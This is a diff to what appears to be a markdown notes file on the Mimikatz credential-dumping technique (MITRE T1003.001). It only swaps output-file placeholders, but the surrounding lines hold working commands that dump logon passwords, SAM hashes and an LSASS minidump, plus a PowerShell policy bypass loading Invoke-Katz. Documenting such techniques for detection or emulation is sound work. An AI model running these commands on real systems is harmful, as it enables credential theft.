@@ -158,8 +158,8 @@ OS Credential Dumping: MimiKatz [[T1003.001](https://attack.mitre.org/techniques
 ```
 msdol.exe privilege::debug sekurlsa::logonpasswords exit
 sekurlsa::Minidump lsassdump.dmp
-cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\pathtooutfile\*.txt"
-cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > *.txt
+cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\pathtooutfile\<output_file>.txt"
+cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > <output_file>.txt
 ```
 <br>
 
